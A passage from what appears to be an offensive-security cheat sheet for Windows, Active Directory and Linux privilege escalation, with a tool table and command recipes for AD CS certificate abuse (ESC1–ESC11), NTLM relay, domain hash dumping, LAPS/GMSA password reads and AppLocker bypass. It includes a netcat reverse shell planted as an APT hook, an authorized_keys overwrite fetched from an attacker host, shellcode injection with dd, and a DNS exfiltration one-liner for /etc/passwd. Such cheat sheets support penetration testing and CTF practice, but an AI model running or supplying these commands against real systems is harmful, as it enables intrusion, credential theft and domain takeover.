| Seatbelt | Seatbelt is a C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives. | https://github.com/GhostPack/Seatbelt |
| SeBackupPrivilege | Use SE_BACKUP_NAME/SeBackupPrivilege to access objects you shouldn't have access to. | https://github.com/giuliano108/SeBackupPrivilege |
| SharpADWS | Active Directory reconnaissance and exploitation for Red Teams via the Active Directory Web Services (ADWS). | https://github.com/wh0amitz/SharpADWS |
| SharpChromium | .NET 4.0 CLR Project to retrieve Chromium data, such as cookies, history and saved logins. | https://github.com/djhohnstein/SharpChromium |
| SharpCollection | Nightly builds of common C# offensive tools, fresh from their respective master branches built and released in a CDI fashion using Azure DevOps release pipelines. | https://github.com/Flangvik/SharpCollection |
| SharpDPAPI | SharpDPAPI is a C# port of some Mimikatz DPAPI functionality. | https://github.com/GhostPack/SharpDPAPI |
| SharpEventPersist | Persistence by writing/reading shellcode from Event Log | https://github.com/improsec/SharpEventPersist |
| SharpExfiltrate | Modular C# framework to exfiltrate loot over secure and trusted channels. | https://github.com/Flangvik/SharpExfiltrate |
| SharpHound | C# Data Collector for BloodHound | https://github.com/BloodHoundAD/SharpHound |
| SharPyShell | SharPyShell - tiny and obfuscated ASP.NET webshell for C# web applications | https://github.com/antonioCoco/SharPyShell |
| SharpStay | .NET project for installing Persistence | https://github.com/0xthirteen/SharpStay |
| Sharp-Suite | Also known by Microsoft as Knifecoat hot_pepper | https://github.com/FuzzySecurity/Sharp-Suite |
| SharpView | C# implementation of harmj0y's PowerView | https://github.com/tevora-threat/SharpView |
| Sherlock | PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities. | https://github.com/rasta-mouse/Sherlock |
| SilentHound | Quietly enumerate an Active Directory Domain via LDAP parsing users, admins, groups, etc. | https://github.com/layer8secure/SilentHound |
| SMBeagle | SMBeagle - Fileshare auditing tool. | https://github.com/punk-security/smbeagle |
| static-binaries | This repo contains a bunch of statically-linked binaries of various tools, along with the Dockerfiles / other build scripts that can be used to build them. | https://github.com/andrew-d/static-binaries |
| SUDO_KILLER | A tool to identify and exploit sudo rules' misconfigurations and vulnerabilities within sudo for linux privilege escalation. | https://github.com/TH3xACE/SUDO_KILLER |
| tickey | Tool to extract Kerberos tickets from Linux kernel keys. | https://github.com/TarlogicSecurity/tickey |
| WADComs | WADComs is an interactive cheat sheet, containing a curated list of offensive security tools and their respective commands, to be used against Windows/AD environments. | https://wadcoms.github.io |
| Watson | Watson is a .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities. | https://github.com/rasta-mouse/Watson |
| WESNG | WES-NG is a tool based on the output of Windows' systeminfo utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. | https://github.com/bitsadmin/wesng
| Whisker | Whisker is a C# tool for taking over Active Directory user and computer accounts by manipulating their msDS-KeyCredentialLink attribute, effectively adding "Shadow Credentials" to the target account. | https://github.com/eladshamir/Whisker |
| Windows-privesc-check | Tries to find misconfigurations that could allow local unprivileged users to escalate privileges to other users or to access local apps (e.g. databases). | https://github.com/pentestmonkey/windows-privesc-check |
| Windows Privilege Escalation Fundamentals | How-to Windows Privilege Escalation | https://www.fuzzysecurity.com/tutorials/16.html |
| Windows Privilege Escalation | Windows privlege escalation methodology | https://github.com/frizb/Windows-Privilege-Escalation |
| WinPwn | Automation for internal Windows Penetrationtest / AD-Security | https://github.com/S3cur3Th1sSh1t/WinPwn |
| wmiexec-Pro | New generation of wmiexec.py | https://github.com/XiaoliChan/wmiexec-Pro |
| WorldWritableDirs.txt | World-writable directories in %windir% | https://gist.github.com/mattifestation/5f9de750470c9e0e1f9c9c33f0ec3e56 |

## accesschk

### Checking File Permissions

```c
C:\> .\accesschk.exe /accepteula -quvw "C:\PATH\TO\FILE\<FILE>.exe"
```

### Checking Service Permissions

```c
C:\> .\accesschk.exe /accepteula -uwcqv <USERNAME> daclsvc
```

### Checking Path Permissions to find Unquoted Service Paths

```c
C:\> .\accesschk.exe /accepteula -uwdq C:\
C:\> .\accesschk.exe /accepteula -uwdq "C:\Program Files\"
C:\> .\accesschk.exe /accepteula -uwdq "C:\Program Files\<UNQUOTED_SERVICE_PATH>"
```

### Checking Registry Entries

```c
C:\> .\accesschk.exe /accepteula -uvwqk <REGISTRY_KEY>
```

## Active Directory Certificate Services (AD CS)

> https://posts.specterops.io/certified-pre-owned-d95910965cd2?gi=d78c66b6ad78

> https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf

> https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7

> https://github.com/ly4k/Certipy

> https://watchdogsacademy.gitbook.io/attacking-active-directory/active-directory-certificate-services-adcs

### Find Vulnerabilities in Active Directory Certificate Services (AD CS)

```c
$ certipy find -username <USERNAME>@<DOMAIN> -password <PASSWORD> -dc-ip <RHOST> -vulnerable -stdout
```

### Domain Escalation

- [ESC1: Misconfigured Certificate Templates](#ESC1-Misconfigured-Certificate-Templates)
- [ESC2: Misconfigured Certificate Templates](#ESC2-Misconfigured-Certificate-Templates)
- [ESC3: Enrollment Agent Templates](#ESC3-Enrollment-Agent-Templates)
- [ESC4: Vulnerable Certificate Template Access Control](#ESC4-Vulnerable-Certificate-Template-Access-Control)
- [ESC5: Vulnerable PKI Object Access Control](#ESC5-Vulnerable-PKI-Object-Access-Control)
- [ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2](#ESC6-EDITF_ATTRIBUTESUBJECTALTNAME2)
- [ESC7: Vulnerable Certificate Authority Access Control](#ESC7-Vulnerable-Certificate-Authority-Access-Control)
- [ESC8: NTLM Relay to AD CS HTTP Endpoints](#ESC8-NTLM-Relay-to-AD-CS-HTTP-Endpoints)
- [ESC9: No Security Extensions](#ESC9-No-Security-Extensions)
- [ESC10: Weak Certificate Mappings](#ESC10-Weak-Certificate-Mappings)
- [ESC11: IF_ENFORCEENCRYPTICERTREQUEST](#ESC11-IF_ENFORCEENCRYPTICERTREQUEST)

### ESC1: Misconfigured Certificate Templates

#### Prerequisistes

- The Enterprise CA grants low-privileged users enrollment rights.
- Manager approval is disabled.
	- mspki-enrollment-flag attribute needs to be set to 0x00000000
- No authorized signatures are required.
	- msPKI-RA-Signature attribute needs to be set to 0x00000000
- An overly permissive certificate template security descriptor grants certificate enrollment rights to low-privileged users.
- The certificate template defines EKUs that enable authentication.
	- mspki-certificate-application-policy attribute needs to contain at least one of the following: Client Authentication (1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) or no EKU (SubCA).
- The certificate template allows requesters to specify a subjectAltName (SAN) in the CSR.
	- msPKI-Certificate-Name-Flag attribute needs to be set to 0x00000001.

#### Usage

```c
$ certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template <TEMPLATE> -upn administrator@<DOMAIN> -dns <RHOST>
```

```c
$ certipy auth -pfx administrator.pfx -dc-ip <RHOST>
```

### ESC2: Misconfigured Certificate Templates

#### Prerequisistes

- The Enterprise CA grants low-privileged users enrollment rights.
- Manager approval is disabled.
	- mspki-enrollment-flag attribute needs to be set to 0x00000000
- No authorized signatures are required.
	- msPKI-RA-Signature attribute needs to be set to 0x00000000
- An overly permissive certificate template security descriptor grants certificate enrollment rights to low-privileged users.
- The certificate template defines Any Purpose EKUs or no EKU.

#### Usage

```c
$ certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template <TEMPLATE>
```

```c
$ certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template User -on-behalf-of '<DOMAIN>\Administrator' -pfx <USERNAME>.pfx
```

```c
$ certipy auth -pfx administrator.pfx -dc-ip <RHOST>
```

### ESC3: Enrollment Agent Templates

#### Prerequisistes

- The Enterprise CA grants low-privileged users enrollment rights.
- Manager approval is disabled.
	- mspki-enrollment-flag attribute needs to be set to 0x00000000
- No authorized signatures are required.
	- msPKI-RA-Signature attribute needs to be set to 0x00000000
- An overly permissive certificate template security descriptor grants certificate enrollment rights to low-privileged users.
- The certificate template defines the Certificate Request Agent EKU.
	- The Certificate Request Agent OID (1.3.6.1.4.1.311.20.2.1) allows for requesting other certificate templates on behalf of other principals.
- Enrollment agent restrictions are not implemented on the CA.

#### Usage

```c
$ certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template <TEMPLATE>
```

```c
$ certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template User -on-behalf-of '<DOMAIN>\Administrator' -pfx <USERNAME>.pfx
```

```c
$ certipy auth -pfx administrator.pfx -dc-ip <RHOST>
```

### ESC4: Vulnerable Certificate Template Access Control

#### Description

`ESC4` is when a user has `write privileges` over a `certificate template`. This can for instance be abused to `overwrite` the `configuration` of the `certificate template` to make the template vulnerable to `ESC1`.

By default, Certipy will overwrite the configuration to make it vulnerable to `ESC1`.

We can specify the `-save-old` parameter to save the old configuration, which is useful for restoring the configuration afterwards.

#### Usage

```c
$ certipy template -username <USERNAME>@<DOMAIN> -password <PASSWORD> -template <TEMPLAET> -save-old
```

The certificate template is now vulnerable to the `ESC1` technique.

Therefore, we can now request a certificate based on the `ESC4` template and specify an `arbitrary SAN` with the `-upn` or `-dns` parameter.

```c
$ certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template <TEMPLATE> -upn administrator@<DOMAIN>
```

```c
$ certipy auth -pfx administrator.pfx -dc-ip <RHOST>
```

##### Restore Configuration

```c
$ certipy template -username <USERNAME>@<DOMAIN> -password <PASSWORD> -template <TEMPLATE> -configuration <TEMPLATE>.json
```

### ESC5: Vulnerable PKI Object Access Control

#### Description

A number of objects `outside` of `certificate templates` and the `certificate authority` itself can have a `security impact` on the entire `AD CS` system.

These possibilities include (but are not limited to):

- CA server’s AD computer object (i.e., compromise through RBCD)
- The CA server’s RPC/DCOM server
- Any descendant AD object or container in the container CN=Public Key Services,CN=Services,CN=Configuration,DC=<COMPANY>,DC=<COM> (e.g., the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, the Enrollment Services container, etc.)

### ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2

#### Description

`ESC6` is when the `CA` specifies the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag. This flag allows the `enrollee` to specify an `arbitrary SAN` on `all certificates` despite a certificate template's configuration.

After the `patch` for the reported vulnerability `CVE-2022–26923`, this technique `no longer works alone`, but must be combined with `ESC10`.

The attack is the same as `ESC1`, except that you can `choose` any `certificate template` that permits `client authentication`. After the `May 2022` security updates, `new certificates` will have a securiy extension that `embeds` the requester's `objectSid` property. For `ESC1`, this property will be `reflected` from the `SAN` specified, but with `ESC6`, this property reflects the requester's `objectSid`, and not from the SAN. Notice that the `objectSid` changes `depending` on the requester.

As such, to abuse `ESC6`, the `environment` must be `vulnerable` to `ESC10 (Weak Certificate Mappings)`, where the `SAN` is preferred `over` the `new security extension`.

#### Usage

```c
$ certipy find -username <USERNAME>@<DOMAIN> -password <PASSWORD> -vulnerable -dc-ip <RHOST> -stdout
```

```c
$ certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template User -upn administrator@<DOMAIN>
```

```c
$ certipy req -ca '<CA>' -username administrator@<DOMAIN> -password <PASSWORD> -target <CA> -template User -upn administrator@<DOMAIN>
```

```c
$ certipy auth -pfx administrator.pfx -dc-ip <RHOST>
```

### ESC7: Vulnerable Certificate Authority Access Control

#### Description

`ESC7` is when a user has the `Manage CA` or `Manage Certificates` access right on a CA. There are no public techniques that can abuse the Manage Certificates access right for domain privilege escalation, but it can be used it to issue or deny pending certificate requests.

The `Certified Pre-Owned whitepaper` mentions that this access right can be used to enable the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag to perform the `ESC6` attack, but this will `not have` any effect `until` the `CA service (CertSvc)` is `restarted`.

#### Alternative Technique by ly4k without restarting the CA service (CertSvc) service

##### Prerequisistes

- User must have the Manage Certificates access rights
- The certificate template SubCA must be enabled.

The technique relies on the fact that users with the `Manage CA` and `Manage Certificates` access right can `issue failed certificate requests`. The `SubCA` certificate `template` is `vulnerable` to `ESC1`, but only administrators can enroll in the template. Thus, a `user` can request to `enroll` in the `SubCA` - `which will be denied` - but then issued by the manager afterwards.

If you only have the `Manage CA` access right, you can grant yourself the `Manage Certificates` access right by adding your user as a new officer.

##### Usage

```c
$ certipy ca -ca '<CA>' -add-officer <USERNAME> -username <USERNAME>@<DOMAIN> -password <PASSWORD>
```

```c
$ certipy ca -ca '<CA>' -enable-template SubCA -username <USERNAME>@<DOMAIN> -password <PASSWORD>
```

```c
$ certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template SubCA -upn administrator@<DOMAIN>
```

```c
$ certipy ca -ca '<CA>' -issue-request <ID> -username <USERNAME>@<DOMAIN> -password <PASSWORD>
```

```c
$ certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -retrieve <ID>
```

```c
$ certipy auth -pfx administrator.pfx -dc-ip <RHOST>
```

### ESC8: NTLM Relay to AD CS HTTP Endpoints

#### Prerequisistes

- Enrollment Service has installed and enabled Web Enrollment via HTTP.

#### Usage

```c
$ certipy relay -target 'http://<CA>'
$ certipy relay -ca '<CA>' -template <TEMPLATE>
```

```c
$ python3 PetitPotam.py <RHOST> <DOMAIN>
```

```c
$ certipy auth -pfx dc.pfx -dc-ip <RHOST>
```

```c
$ export KRB5CCNAME=dc.ccache
```

```c
$ sudo secretsdump.py -k -no-pass <DOMAIN>/'dc$'@<DOMAIN>
```

##### Coercing

```c
$ sudo ntlmrelayx.py -t http://<RHOST>/certsrv/certfnsh.asp -smb2support --adcs --template <TEMPLATE>
```

```c
$ python3 PetitPotam.py <RHOST> <DOMAIN>
```

```c
$ python3 gettgtpkinit.py -pfx-base64 $(cat base64.b64) '<DOMAIN>'/'dc$' 'dc.ccache'
```

```c
$ export KRB5CCNAME=dc.ccache
```

```c
$ sudo secretsdump.py -k -no-pass <DOMAIN>/'dc$'@<DOMAIN>
```

### ESC9: No Security Extensions

#### Prerequisites

- StrongCertificateBindingEnforcement set to 1 (default) or 0
	- StrongCertificateBindingEnforcement not set to 2 (default: 1) or CertificateMappingMethods contains UPN flag
- Certificate contains the CT_FLAG_NO_SECURITY_EXTENSION flag in the msPKI-Enrollment-Flag value
- Certificate specifies any client authentication EKU
- GenericWrite over any account A to compromise any account B

#### Usage

```c
$ certipy shadow auto -username <USERNAME>@<DOMAIN> -password <PASSWORD> -account <USERNAME>
```

```c
$ certipy account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME> -upn Administrator
```

```c
$ certipy req -ca '<CA>' -username <USERNAME> -hashes 54296a48cd30259cc88095373cec24da -template <TEMPLATE>
```

```c
$ certipy account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME> -upn <USERNAME>@<DOMAIN>
```

```c
$ certipy auth -pfx administrator.pfx -domain <DOMAIN>
```

### ESC10: Weak Certificate Mappings

#### Prerequisistes

- Case 1 : `StrongCertificateBindingEnforcement` set to `0`
	- HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc StrongCertificateBindingEnforcement. Default value 1, previously 0.
	- GenericWrite over any account A to compromise any account B

- Case 2 : `CertificateMappingMethods` contains `UPN` bit `(0x4)`
	- HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel CertificateMappingMethods. Default value 0x18 (0x8 | 0x10), previously 0x1F.	
	- GenericWrite over any account A to compromise any account B without a userPrincipalName property (machine accounts and built-in domain administrator Administrator)

#### Usage

##### Case 1

```c
$ certipy shadow auto -username <USERNAME>@<DOMAIN> -password <PASSWORD> -account <USERNAME>
```

```c
$ certipy account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME> -upn Administrator
```

```c
$ certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -hashes a87f3a337d73085c45f9416be5787d86
```

```c
$ certipy account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME -upn <USERNAME>@<DOMAIN>
```

```c
$ certipy auth -pfx administrator.pfx -domain <DOMAIN>
```

##### Case 2

```c
$ certipy shadow auto -username <USERNAME>@<DOMAIN> -password <PASSWORD> -account <USERNAME>
```

```c
$ certipy account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME> -upn 'DC$@<DOMAIN>'
```

```c
$ certipy req -ca 'CA' -username <USERNAME>@<DOMAIN> -password -hashes a87f3a337d73085c45f9416be5787d86
```

```c
$ certipy account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME -upn <USERNAME>@<DOMAIN>
```

```c
$ certipy auth -pfx dc.pfx -dc-ip <RHOST> -ldap-shell
```

### ESC11: IF_ENFORCEENCRYPTICERTREQUEST

#### Prerequisistes

- Certificate Authority is not configured with IF_ENFORCEENCRYPTICERTREQUEST

##### Usage

```c
$ certipy relay -target 'rpc://<CA>' -ca 'CA'
```

```c
$ certipy auth -pfx administrator.pfx -domain <DOMAIN>
```

## Apache2

### Read first Line of a File with apache2 Binary

```c
$ sudo /usr/sbin/apache2 -f <FILE>
```

## AppLocker

> https://github.com/api0cradle/UltimateAppLockerByPassList

### Bypass List (Windows 10 Build 1803)

```c
C:\Windows\Tasks
C:\Windows\Temp
C:\Windows\tracing
C:\Windows\Registration\CRMLog
C:\Windows\System32\FxsTmp
C:\Windows\System32\com\dmp
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)
C:\Windows\SysWOW64\FxsTmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
```

## APT

```c
$ echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f"};' > /etc/apt/apt.conf.d/<FILE>
```

## arua2c

```c
$ aria2c -d /root/.ssh/ -o authorized_keys "http://<LHOST>/authorized_keys" --allow-overwrite=true
```

## Bash

### SUID Privilege Escalation

```c
$ cp /bin/bash .
$ chmod +s bash
$ bash -p
```

### White Collar eval Arbitrary Code Execution

> https://www.vidarholen.net/contents/blog/?p=716

#### Example

```c
#!/bin/bash
chmod +s /bin/bash
```

```c
'a[$(/tmp/<FILE>.sh>&2)]+42' /tmp/<FILE>.sh
```

## Bash Debugging Mode

- Bash <4.4

```c
$ env -i SHELLOPTS=xtrace PS4='$(chmod +s /bin/bash)' /usr/local/bin/<BINARY>
```

## BloodHound

> https://github.com/BloodHoundAD/BloodHound

### Installation

```c
$ sudo apt-get install openjdk-11-jdk
```

```c
$ pip install bloodhound
$ sudo apt-get install neo4j
$ sudo apt-get install bloodhound
```

### Installing and starting Database

```c
$ sudo wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -
$ sudo echo 'deb https://debian.neo4j.com stable 4' | sudo tee /etc/apt/sources.list.d/neo4j.list > /dev/null
$ sudo apt-get update
$ sudo apt-get install apt-transport-https
$ sudo apt-get install neo4j
$ sudo systemctl stop neo4j
```

### Starting Neo4j

#### Option 1

```c
$ cd /usr/bin
$ sudo ./neo4j console
```

#### Option 2

```c
$ systemctl start neo4j
```

#### Option 3

```c
$ sudo neo4j start console
```

>  http://localhost:7474/browser/

### Start BloodHound

```c
$ ./bloodhound --no-sandbox
$ sudo bloodhound --no-sandbox
```

#### Alternatively

```c
$ sudo npm install -g electron-packager
$ git clone https://github.com/BloodHoundAD/Bloodhound
$ cd BloodHound
$ npm install
$ npm run linuxbuild
$ cd BloodHound-linux-x64
$ sudo ./BloodHound --no-sandbox
```

### Docker Container

```c
$ docker run \ --publish=7474:7474 --publish=7687:7687 \ --volume=$HOME/neo4j/data:/data \ neo4j
$ docker run -itd -p 7687:7687 -p 7474:7474 --env NEO4J_AUTH=neo4j/<PASSWORD> -v $(pwd)/neo4j:/data neo4j:4.4-community
```

### Database Password Reset

>  http://localhost:7474/browser/

```c
ALTER USER neo4j SET PASSWORD '<PASSWORD>'
```

### Custom Queries

> https://github.com/mgeeky/Penetration-Testing-Tools/blob/master/red-teaming/bloodhound/Handy-BloodHound-Cypher-Queries.md

#### Custom Query Location on macOS

```c
/System/Volumes/Data/Users/<USERNAME>/Library/Application Support/bloodhound/
```

## BloodHound Python

### Build Docker Container

```c
$ docker build -t bloodhound.py
```

### Collection Method All

```c
$ bloodhound-python -u <USERNAME> -p "<PASSWORD>" -d <DOMAIN> -gc <DOMAIN> -c all -ns <RHOST>
$ bloodhound-python -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN> -dc <RHOST> -ns <RHOST> --dns-tcp -no-pass -c ALL --zip
```

### LDAP Dumping

```c
$ bloodhound-python -u <USERNAME> -p '<PASSWORD>' -ns <RHOST> -d <DOMAIN> -c All
```

### Parsing

```c
$ cat 20220629013701_users.json | jq | grep \"name\"
```

#### Searching for User Description in BloodHound Data

```c
$ cat 20220629013701_users.json | jq '.data[].Properties | select(.enabled == true) | .name + " " .description'
```

## bloodyAD

> https://github.com/CravateRouge/bloodyAD

```c
$ bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> get object Users --attr member                                        // Get group members
$ bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> get object 'DC=<DOMAIN>,DC=local' --attr minPwdLength                 // Get minimum password length policy
$ bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> get object 'DC=<DOMAIN>,DC=local' --attr msDS-Behavior-Version        // Get AD functional level
$ bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> get children 'DC=<DOMAIN>,DC=local' --type user                       // Get all users of the domain
$ bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> get children 'DC=<DOMAIN>,DC=local' --type computer                   // Get all computers of the domain
$ bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> get children 'DC=<DOMAIN>,DC=local' --type container                  // Get all containers of the domain
$ bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> add uac <USERNAME> DONT_REQ_PREAUTH                                   // Enable DONT_REQ_PREAUTH for ASREPRoast
$ bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> remove uac <USERNAME> ACCOUNTDISABLE                                  // Disable ACCOUNTDISABLE
$ bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> get object <USERNAME> --attr userAccountControl                       // Get UserAccountControl flags
$ bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> get object '<OBJECT>$' --attr msDS-ManagedPassword                    // Read GMSA account password
$ bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> get object '<OBJECT>$' --attr ms-Mcs-AdmPwd                           // Read LAPS password
$ bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> get object 'DC=<DOMAIN>,DC=local' --attr ms-DS-MachineAccountQuota    // Read quota for adding computer objects to domain
$ bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> add dnsRecord <RECORD> <LHOST>                                        // Add a new DNS entry
$ bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> remove dnsRecord <RECORD> <LHOST>                                     // Remove a DNS entry
$ bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> get dnsDump                                                           // Get AD DNS records
```

## Certify

> https://github.com/GhostPack/Certify

```c
PS C:\> Certify find /vulnerable
PS C:\> Certify.exe find /vulnerable /currentuser
```

## Certipy

> https://github.com/ly4k/Certipy

> https://github.com/ly4k/BloodHound/

### Common Commands

```c
$ certipy find -dc-ip <RHOST> -u <USERNAME>@<DOMAIN> -p <PASSWORD>
$ certipy find -dc-ip <RHOST> -u <USERNAME> -p <PASSWORD> -vulnerable -stdout
```

### Certificate Handling

#### Account Creation

```c
$ certipy account create -username <USERNAME>@<DOMAIN> -password <PASSWORD> -dc-ip <RHOST> -dns <DOMAIN_CONTROLLER_DNS_NAME> -user <COMPUTERNAME>
```

#### Authentication

```c
$ certipy auth -pfx <FILE>.pfx -dc-ip <RHOST> -u <USERNAME> -domain <DOMAIN>
```

##### LDAP-Shell

```c
$ certipy auth -pfx <FILE>.pfx -dc-ip <RHOST> -u <USERNAME> -domain <DOMAIN> -ldap-shell
```

```c
# add_user <USERNAME>
# add_user_to_group <GROUP>
```

#### Certificate Forging

```c
$ certipy template -username <USERNAME>@<DOMAIN> -password <PASSWORD> -template Web -dc-ip <RHOST> -save-old
```

#### Certificate Request

Run the following command twice because of a current issue with `certipy`.

```c
$ certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <FQDN> -template <TEMPLATE> -dc-ip <RHOST>
```

```c
$ certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <FQDN> -template <TEMPLATE> -dc-ip <RHOST> -upn <USERNAME>@<DOMAIN> -dns <FQDN>
$ certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <FQDN> -template <TEMPLATE> -dc-ip <RHOST> -upn <USERNAME>@<DOMAIN> -dns <FQDN> -debug
```

### Start BloodHound Fork

```c
$ ./BloodHound --disable-gpu-sandbox
```

## ClamAV

### File Replacement Privilege Escalation

- Vulnerable Version 1.0.0

```c
$ clamscan --version
ClamAV 1.0.0/26853/Fri Mar 24 07:24:11 2023
```

#### Example

Create a custom `authorized_keys` file to replace another one.
Then create a custom `database` with the `hex value` of the string you want to parse for.

```c
$ printf ssh | xxd -p
```

##### custom_malware.db

```c
Malware=737368
```

#### Execution

```c
$ clamscan --remove=yes /root/.ssh/authorized_keys -d custom_malware.db
$ clamscan authorized_keys --copy=/root/.ssh/ -d custom_malware.db
```

## Coercer

```c
$ python3 -m coercer scan -t <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> -v
```

## Credentials File

> https://twitter.com/NinjaParanoid/status/1516442028963659777?t=g7ed0vt6ER8nS75qd-g0sQ&s=09

> https://www.nirsoft.net/utils/credentials_file_view.html

```c
C:\ rundll32 keymgr.dll, KRShowKeyMgr
```

## dd

### Execute Shellcode

```c
$ dd of=/proc/$$/mem bs=1 seek=$(($(cut -d" " -f9</proc/$$/syscall))) if=<(base64 -d<<<utz+IUO+aRkSKL+t3uH+McCwqQ8F) conv=notrunc
```

## DNS

### Data Exfiltration

#### Extract /etc/passwd

```perl
$ perl -E 'qx^Cdig $_.$$.${\(rand)}.example.com^Cfor(unpack"H*",qx^?cat /etc/pas*^?)=~m^H(..)^Hgc'
```

^C, ^H, and ^? are the corresponding single ASCII values.

## Data Protection API (DPAPI)

- https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords

### List Vault

```c
C:\> vaultcmd /listcreds:"Windows Credentials" /all
```

### Credential File Locations

```c
C:\> dir /a:h C:\Users\<USERNAME>\AppData\Local\Microsoft\Credentials\
C:\> dir /a:h C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Credentials\
PS C:\> Get-ChildItem -Hidden C:\Users\<USERNAME>\AppData\Local\Microsoft\Credentials\
PS C:\> Get-ChildItem -Hidden C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Credentials\
```

### Master Key Locations

```c
PS C:\> Get-ChildItem C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Protect\
PS C:\> Get-ChildItem C:\Users\<USERNAME>\AppData\Local\Microsoft\Protect\
PS C:\> Get-ChildItem -Hidden C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Protect\
PS C:\> Get-ChildItem -Hidden C:\Users\<USERNAME>\AppData\Local\Microsoft\Protect\
PS C:\> Get-ChildItem -Hidden C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Protect\<SID>
PS C:\> Get-ChildItem -Hidden C:\Users\<USERNAME>\AppData\Local\Microsoft\Protect\<SID>
```

#### Examples

```c
PS C:\Users\<USERNAME>\Appdata\Roaming\Microsoft\Credentials> Get-ChildItem -Hidden
Get-ChildItem -Hidden


    Directory: C:\Users\<USERNAME>\Appdata\Roaming\Microsoft\Credentials


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a-hs-          5/9/2023   2:08 PM            358 18A1927A997A794B65E9849883AC3F3E                                     
-a-hs-          5/9/2023   4:03 PM            398 84F1CAEEBF466550F4967858F9353FB4                                     
-a-hs-         1/18/2024  11:53 AM            374 E76CCA3670CD9BB98DF79E0A8D176F1E
```

```c
PS C:\Users\<USERNAME>\Appdata\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107> Get-ChildItem -Hidden
Get-ChildItem -Hidden


    Directory: C:\Users\<USERNAME>\Appdata\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
